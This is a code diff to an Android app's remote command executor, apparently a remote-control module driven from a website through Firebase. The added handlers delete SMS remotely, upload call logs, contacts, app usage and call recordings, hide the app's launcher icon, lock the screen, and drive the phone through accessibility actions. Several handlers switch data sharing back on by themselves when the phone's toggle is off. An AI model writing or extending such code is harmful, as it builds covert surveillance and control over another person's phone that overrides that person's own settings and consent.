@@ -21,9 +21,13 @@ import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageMetadata;
 import com.google.firebase.storage.StorageReference;
 
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.io.InputStream;
 import java.util.HashMap;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -76,8 +80,20 @@ public final class RemoteModuleCommandExecutor {
                     case MESSAGES_SYNC:
                         syncMessages(payload, ack);
                         break;
+                    case MESSAGES_DELETE:
+                        deleteMessages(payload, ack);
+                        break;
+                    case CALL_LOGS_SYNC:
+                        syncCallLogs(payload, ack);
+                        break;
+                    case CONTACTS_SYNC:
+                        syncContacts(payload, ack);
+                        break;
                     case APPS_INDEX:
                         indexApps(ack);
+                        break;
+                    case APP_USAGE_SYNC:
+                        syncAppUsage(payload, ack);
                         break;
                     case APP_BLOCK:
                         appBlock(payload, ack);
@@ -87,6 +103,21 @@ public final class RemoteModuleCommandExecutor {
                         break;
                     case APP_BLOCKS_SYNC:
                         appBlocksSync(ack);
+                        break;
+                    case SET_ALLOW_UNINSTALL:
+                        setAllowUninstall(payload, ack);
+                        break;
+                    case UNINSTALL_APP:
+                        uninstallApp(ack);
+                        break;
+                    case SET_LAUNCHER_HIDDEN:
+                        setLauncherHidden(payload, ack);
+                        break;
+                    case SCREEN_LOCK:
+                        screenLock(ack);
+                        break;
+                    case SCREEN_UNLOCK:
+                        screenUnlock(ack);
                         break;
                     case SCREEN_RECORD_START:
                         screenRecordStart(payload, ack);
@@ -102,6 +133,27 @@ public final class RemoteModuleCommandExecutor {
                     case SCREEN_RECORD_RESUME:
                         RemoteScreenRecordService.resume(app);
                         ack.ok("resume_requested");
+                        break;
+                    case A11Y_START_SESSION:
+                    case A11Y_STOP_SESSION:
+                    case A11Y_PAUSE_SESSION:
+                    case A11Y_RESUME_SESSION:
+                    case A11Y_EMERGENCY_STOP:
+                    case A11Y_STATUS:
+                    case A11Y_TREE:
+                    case A11Y_TAP:
+                    case A11Y_DOUBLE_TAP:
+                    case A11Y_LONG_PRESS:
+                    case A11Y_SWIPE:
+                    case A11Y_DRAG:
+                    case A11Y_GLOBAL_ACTION:
+                    case A11Y_NODE_ACTION:
+                    case A11Y_SET_TEXT:
+                    case A11Y_OPEN_APP:
+                    case A11Y_RUN_TASK:
+                    case A11Y_CANCEL_TASK:
+                        new RemoteAccessibilityCommandHandler(app)
+                                .handle(action.name(), payload, commandId, ack);
                         break;
                     case FILE_LIST:
                         fileList(payload, ack);
@@ -148,9 +200,17 @@ public final class RemoteModuleCommandExecutor {
 
     private void getCurrentLocation(@NonNull Ack ack) {
         RemoteModulePrefs prefs = new RemoteModulePrefs(app);
-        if (!prefs.isLocationSharingEnabled()) {
-            ack.fail("LOCATION_DISABLED", "Location sharing is disabled on the phone.");
+        if (!RemotePermissionChecks.hasForegroundLocation(app)) {
+            ack.fail("PERMISSION_DENIED", "Location permission not granted on the phone.");
             return;
+        }
+        // Auto-enable Location Sharing when OS permission is already granted.
+        if (!prefs.isLocationSharingEnabled() || RemoteModulePrefs.MODE_DISABLED.equals(prefs.getLocationMode())) {
+            prefs.setLocationSharingEnabled(true);
+            prefs.setLocationMode(RemotePermissionChecks.hasBackgroundLocation(app)
+                    ? RemoteModulePrefs.MODE_BACKGROUND
+                    : RemoteModulePrefs.MODE_CURRENT_ONLY);
+            new RemoteDeviceInfoRepository(app).publishModuleFlags();
         }
         FusedLocationProviderClient fused = LocationServices.getFusedLocationProviderClient(app);
         CurrentLocationRequest req = new CurrentLocationRequest.Builder()
@@ -179,9 +239,16 @@ public final class RemoteModuleCommandExecutor {
 
     private void startLive(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
         RemoteModulePrefs prefs = new RemoteModulePrefs(app);
-        if (!prefs.isLocationSharingEnabled()) {
-            ack.fail("LOCATION_DISABLED", "Location sharing is disabled on the phone.");
+        if (!RemotePermissionChecks.hasForegroundLocation(app)) {
+            ack.fail("PERMISSION_DENIED", "Location permission not granted on the phone.");
             return;
+        }
+        if (!prefs.isLocationSharingEnabled() || RemoteModulePrefs.MODE_DISABLED.equals(prefs.getLocationMode())) {
+            prefs.setLocationSharingEnabled(true);
+            prefs.setLocationMode(RemotePermissionChecks.hasBackgroundLocation(app)
+                    ? RemoteModulePrefs.MODE_BACKGROUND
+                    : RemoteModulePrefs.MODE_CURRENT_ONLY);
+            new RemoteDeviceInfoRepository(app).publishModuleFlags();
         }
         long duration = RemoteMapValues.longValue(payload, "durationMs", prefs.getLiveDurationMs());
         RemoteLocationSharingService.start(app, duration, null);
@@ -239,6 +306,39 @@ public final class RemoteModuleCommandExecutor {
             ack.fail("WRITE_FAILED", "Could not save installed apps list.");
         } else {
             ack.ok("indexed:" + Math.max(0, n));
+        }
+    }
+
+    private void syncAppUsage(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
+        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
+        if (!prefs.isAppUsageSharingEnabled()) {
+            if (RemoteAppUsageMirror.hasUsageAccess(app)) {
+                prefs.setAppUsageSharingEnabled(true);
+                new RemoteDeviceInfoRepository(app).publishModuleFlags();
+            } else {
+                ack.fail("USAGE_ACCESS_REQUIRED",
+                        "Usage Access is off. Phone → Permissions → Recent Apps → allow Usage Access.");
+                return;
+            }
+        }
+        if (!RemoteAppUsageMirror.hasUsageAccess(app)) {
+            ack.fail("USAGE_ACCESS_REQUIRED",
+                    "Usage Access is off. Open system Usage Access settings and enable this app.");
+            return;
+        }
+        int days = (int) RemoteMapValues.longValue(payload, "days", 7);
+        int n = RemoteAppUsageMirror.syncRecent(app, days);
+        if (n == RemoteAppUsageMirror.ERR_DISABLED) {
+            ack.fail("APP_USAGE_DISABLED", "Recent apps history is disabled on the phone.");
+        } else if (n == RemoteAppUsageMirror.ERR_PERMISSION) {
+            ack.fail("USAGE_ACCESS_REQUIRED",
+                    "Usage Access not granted. Phone → Permissions → Recent Apps.");
+        } else if (n == RemoteAppUsageMirror.ERR_AUTH) {
+            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
+        } else if (n == RemoteAppUsageMirror.ERR_WRITE) {
+            ack.fail("WRITE_FAILED", "Could not save app usage history.");
+        } else {
+            ack.ok("synced:" + Math.max(0, n));
         }
     }
 
@@ -301,6 +401,87 @@ public final class RemoteModuleCommandExecutor {
         ack.ok("active:" + n);
     }
 
+    private void setAllowUninstall(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
+        boolean allow = RemoteMapValues.bool(payload, "allowUninstall", true);
+        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
+        prefs.setAllowUninstall(allow);
+        if (allow) {
+            // Optional: drop Device Admin so the system Uninstall button works immediately.
+            // Camera lock will ask to re-enable admin later if needed.
+            boolean removeAdmin = RemoteMapValues.bool(payload, "removeDeviceAdmin", true);
+            if (removeAdmin) {
+                RemoteDeviceAdminReceiver.tryRemoveActiveAdmin(app);
+            }
+        }
+        new RemoteDeviceInfoRepository(app).publishModuleFlags();
+        ack.ok(allow ? "uninstall_allowed" : "uninstall_protected");
+    }
+
+    private void uninstallApp(@NonNull Ack ack) {
+        Runnable run = () -> {
+            try {
+                RemoteSelfUninstallController.requestFromWebsite(app);
+                ack.ok("uninstall_ui_opened");
+            } catch (Throwable t) {
+                Log.e(TAG, "UNINSTALL_APP failed", t);
+                ack.fail("UNINSTALL_FAILED", t.getMessage() != null ? t.getMessage() : "uninstall failed");
+            }
+        };
+        if (android.os.Looper.myLooper() == android.os.Looper.getMainLooper()) {
+            run.run();
+        } else {
+            new android.os.Handler(android.os.Looper.getMainLooper()).post(run);
+        }
+    }
+
+    private void setLauncherHidden(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
+        boolean hidden = RemoteMapValues.bool(payload, "launcherHidden", false);
+        RemoteControlPrefs controlPrefs = new RemoteControlPrefs(app);
+        if (hidden && controlPrefs.getDialerPasscode().isEmpty()) {
+            ack.fail(
+                    "PASSCODE_REQUIRED",
+                    "Set a dialer passcode on the phone (Remote Control → Management) before hiding from the website.");
+            return;
+        }
+        controlPrefs.setLauncherHidden(hidden);
+        // goHomeAfterHide=false: do not yank the user to home from a remote command.
+        RemoteLauncherVisibility.setLauncherIconVisible(app, !hidden, false);
+        try {
+            if (hidden) {
+                RemoteHiddenUnlockNotifications.showOngoingUnlock(app);
+            } else {
+                RemoteHiddenUnlockNotifications.cancelOngoing(app);
+            }
+        } catch (Throwable ignored) {
+        }
+        new RemoteDeviceInfoRepository(app).publishModuleFlags();
+        ack.ok(hidden ? "launcher_hidden" : "launcher_visible");
+    }
+
+    private void screenLock(@NonNull Ack ack) {
+        int result = RemoteScreenLockController.lockNow(app);
+        if (result == RemoteScreenLockController.OK) {
+            ack.ok("locked");
+        } else if (result == RemoteScreenLockController.ERR_NO_ADMIN) {
+            ack.fail("DEVICE_ADMIN_REQUIRED",
+                    "Enable Device Admin on the phone (Remote Control → Permissions) to lock the screen.");
+        } else {
+            ack.fail("LOCK_FAILED", "Could not lock the screen.");
+        }
+    }
+
+    private void screenUnlock(@NonNull Ack ack) {
+        int result = RemoteScreenLockController.unlockWake(app);
+        if (result == RemoteScreenLockController.OK) {
+            boolean locked = RemoteScreenLockController.isKeyguardLocked(app);
+            ack.ok(locked
+                    ? "wake_requested_secure_lock"
+                    : "unlock_requested");
+        } else {
+            ack.fail("UNLOCK_FAILED", "Could not wake/unlock the screen.");
+        }
+    }
+
     private void screenRecordStart(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
         RemoteModulePrefs prefs = new RemoteModulePrefs(app);
         if (!prefs.isScreenRecordEnabled()) {
@@ -320,9 +501,8 @@ public final class RemoteModuleCommandExecutor {
             ack.fail("ALREADY_RECORDING", "A recording is already in progress");
             return;
         }
-        // Always show the system MediaProjection dialog (token is one-shot, not reusable).
-        app.startActivity(RemoteMediaProjectionConsentActivity.intentForRecord(
-                app, transferId, recordingId, withMic, quality, fps));
+        RemoteScreenRecordService.setPending(recordingId, transferId);
+        RemoteScreenRecordLaunchService.start(app, transferId, recordingId, withMic, quality, fps);
         ack.ok("awaiting_projection_permission");
     }
 
@@ -348,6 +528,90 @@ public final class RemoteModuleCommandExecutor {
             ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
         } else if (n == RemoteSmsMirror.ERR_WRITE) {
             ack.fail("WRITE_FAILED", "Could not save messages to cloud.");
+        } else {
+            ack.ok("synced:" + Math.max(0, n));
+        }
+    }
+
+    private void deleteMessages(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
+        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
+        if (!prefs.isMessagesSharingEnabled() && !RemoteSmsMirror.hasSmsPermission(app)) {
+            ack.fail("MESSAGES_DISABLED",
+                    "SMS permission is off. Phone → Permissions → SMS / Messages.");
+            return;
+        }
+        Object rawItems = payload.get("items");
+        if (!(rawItems instanceof java.util.List) || ((java.util.List<?>) rawItems).isEmpty()) {
+            ack.fail("BAD_REQUEST", "items required");
+            return;
+        }
+        @SuppressWarnings("unchecked")
+        java.util.List<Object> list = (java.util.List<Object>) rawItems;
+        int result = RemoteSmsMirror.deleteMessages(app, list);
+        if (result == RemoteSmsMirror.ERR_AUTH) {
+            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
+        } else if (result == RemoteSmsMirror.ERR_PERMISSION) {
+            ack.fail("PERMISSION_DENIED", "Cannot modify SMS on this phone (permission denied).");
+        } else {
+            ack.ok("deleted:" + Math.max(0, result));
+        }
+    }
+
+    private void syncCallLogs(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
+        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
+        if (!prefs.isCallLogsSharingEnabled()) {
+            if (RemoteCallLogMirror.hasCallLogPermission(app)) {
+                prefs.setCallLogsSharingEnabled(true);
+                new RemoteDeviceInfoRepository(app).publishModuleFlags();
+            } else {
+                ack.fail("CALL_LOGS_DISABLED",
+                        "Call log permission is off. Phone → Permissions → Call logs.");
+                return;
+            }
+        }
+        int limit = (int) RemoteMapValues.longValue(payload, "limit", 150);
+        int n = RemoteCallLogMirror.syncRecent(app, limit);
+        if (n == RemoteCallLogMirror.ERR_DISABLED) {
+            ack.fail("CALL_LOGS_DISABLED", "Call logs sharing is disabled on the phone.");
+        } else if (n == RemoteCallLogMirror.ERR_PERMISSION) {
+            ack.fail("PERMISSION_DENIED", "READ_CALL_LOG not granted. Phone → Permissions → Call logs.");
+        } else if (n == RemoteCallLogMirror.ERR_AUTH) {
+            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
+        } else if (n == RemoteCallLogMirror.ERR_WRITE) {
+            ack.fail("WRITE_FAILED", "Could not save call logs to cloud.");
+        } else {
+            try {
+                RemoteCallRecordingWatcher.syncWithPrefs(app);
+                RemoteCallRecordingLinker.attachOemRecordings(app, 15);
+            } catch (Exception e) {
+                Log.w(TAG, "call recording attach failed", e);
+            }
+            ack.ok("synced:" + Math.max(0, n));
+        }
+    }
+
+    private void syncContacts(@NonNull Map<String, Object> payload, @NonNull Ack ack) {
+        RemoteModulePrefs prefs = new RemoteModulePrefs(app);
+        if (!prefs.isContactsSharingEnabled()) {
+            if (RemoteContactsMirror.hasContactsPermission(app)) {
+                prefs.setContactsSharingEnabled(true);
+                new RemoteDeviceInfoRepository(app).publishModuleFlags();
+            } else {
+                ack.fail("CONTACTS_DISABLED",
+                        "Contacts permission is off. Phone → Permissions → Contacts.");
+                return;
+            }
+        }
+        int limit = (int) RemoteMapValues.longValue(payload, "limit", 1000);
+        int n = RemoteContactsMirror.syncAll(app, limit);
+        if (n == RemoteContactsMirror.ERR_DISABLED) {
+            ack.fail("CONTACTS_DISABLED", "Contacts sharing is disabled on the phone.");
+        } else if (n == RemoteContactsMirror.ERR_PERMISSION) {
+            ack.fail("PERMISSION_DENIED", "READ_CONTACTS not granted. Phone → Permissions → Contacts.");
+        } else if (n == RemoteContactsMirror.ERR_AUTH) {
+            ack.fail("NOT_SIGNED_IN", "Phone is not signed in.");
+        } else if (n == RemoteContactsMirror.ERR_WRITE) {
+            ack.fail("WRITE_FAILED", "Could not save contacts to cloud.");
         } else {
             ack.ok("synced:" + Math.max(0, n));
         }
@@ -521,29 +785,85 @@ public final class RemoteModuleCommandExecutor {
         String deviceId = new RemoteControlPrefs(app).getOrCreateDeviceId();
         String path = "users/" + user.getUid() + "/devices/" + deviceId + "/" + folder
                 + "/" + transferId + "/file";
-        updateTransfer(user.getUid(), transferId, "uploading", 10, path, mime, null, null);
-        try {
-            InputStream in = app.getContentResolver().openInputStream(uri);
-            if (in == null) {
-                ack.fail("READ_FAILED", "Cannot read file");
-                return;
+        final String uploadMime = normalizeUploadMime(mime);
+        final String uid = user.getUid();
+        updateTransfer(uid, transferId, "uploading", 10, path, uploadMime, null, null);
+        io.execute(() -> {
+            File temp = null;
+            try {
+                temp = copyUriToTempFile(uri);
+                if (temp == null || !temp.exists() || temp.length() <= 0L) {
+                    failUpload(uid, transferId, path, uploadMime, ack, "READ_FAILED",
+                            "Cannot read file or file is empty");
+                    return;
+                }
+                final File uploadFile = temp;
+                StorageMetadata meta = new StorageMetadata.Builder().setContentType(uploadMime).build();
+                StorageReference ref = FirebaseStorage.getInstance().getReference(path);
+                ref.putFile(Uri.fromFile(uploadFile), meta)
+                        .addOnSuccessListener(t -> {
+                            updateTransfer(uid, transferId, "ready", 100, path, uploadMime, null, null);
+                            ack.ok("uploaded");
+                        })
+                        .addOnFailureListener(e -> failUpload(uid, transferId, path, uploadMime, ack,
+                                "UPLOAD_FAILED", e.getMessage()))
+                        .addOnCompleteListener(t -> {
+                            if (uploadFile.exists() && !uploadFile.delete()) {
+                                Log.w(TAG, "temp transfer file delete failed");
+                            }
+                        });
+            } catch (Exception e) {
+                failUpload(uid, transferId, path, uploadMime, ack, "UPLOAD_FAILED", e.getMessage());
+                if (temp != null && temp.exists() && !temp.delete()) {
+                    Log.w(TAG, "temp transfer file delete failed");
+                }
             }
-            StorageMetadata meta = new StorageMetadata.Builder().setContentType(mime).build();
-            StorageReference ref = FirebaseStorage.getInstance().getReference(path);
-            ref.putStream(in, meta)
-                    .addOnSuccessListener(t -> {
-                        updateTransfer(user.getUid(), transferId, "ready", 100, path, mime, null, null);
-                        ack.ok("uploaded");
-                    })
-                    .addOnFailureListener(e -> {
-                        updateTransfer(user.getUid(), transferId, "failed", 0, path, mime, "UPLOAD_FAILED",
-                                e.getMessage());
-                        ack.fail("UPLOAD_FAILED", e.getMessage());
-                    });
-        } catch (Exception e) {
-            updateTransfer(user.getUid(), transferId, "failed", 0, path, mime, "UPLOAD_FAILED", e.getMessage());
-            ack.fail("UPLOAD_FAILED", e.getMessage());
+        });
+    }
+
+    private void failUpload(@NonNull String uid,
+                            @NonNull String transferId,
+                            @NonNull String path,
+                            @NonNull String mime,
+                            @NonNull Ack ack,
+                            @NonNull String errorCode,
+                            @Nullable String errorMessage) {
+        updateTransfer(uid, transferId, "failed", 0, path, mime, errorCode, errorMessage);
+        ack.fail(errorCode, errorMessage);
+    }
+
+    @Nullable
+    private File copyUriToTempFile(@NonNull Uri uri) throws IOException {
+        try (InputStream in = app.getContentResolver().openInputStream(uri)) {
+            if (in == null) return null;
+            File temp = File.createTempFile("arb_xfer_", ".bin", app.getCacheDir());
+            try (FileOutputStream out = new FileOutputStream(temp)) {
+                byte[] buf = new byte[8192];
+                int n;
+                while ((n = in.read(buf)) >= 0) {
+                    if (n > 0) out.write(buf, 0, n);
+                }
+            }
+            return temp;
         }
+    }
+
+    @NonNull
+    private static String normalizeUploadMime(@Nullable String mime) {
+        if (mime == null || mime.trim().isEmpty()) {
+            return "application/octet-stream";
+        }
+        String m = mime.trim().toLowerCase(Locale.US);
+        if (m.startsWith("image/") || m.startsWith("video/") || m.startsWith("audio/")
+                || m.equals("application/pdf") || m.startsWith("text/")
+                || m.equals("application/zip") || m.equals("application/octet-stream")) {
+            return m;
+        }
+        if (m.contains("jpeg") || m.contains("jpg")) return "image/jpeg";
+        if (m.contains("png")) return "image/png";
+        if (m.contains("mp4")) return "video/mp4";
+        if (m.contains("mp3") || m.contains("mpeg")) return "audio/mpeg";
+        return "application/octet-stream";
     }
 
     private void updateTransfer(@NonNull String uid,
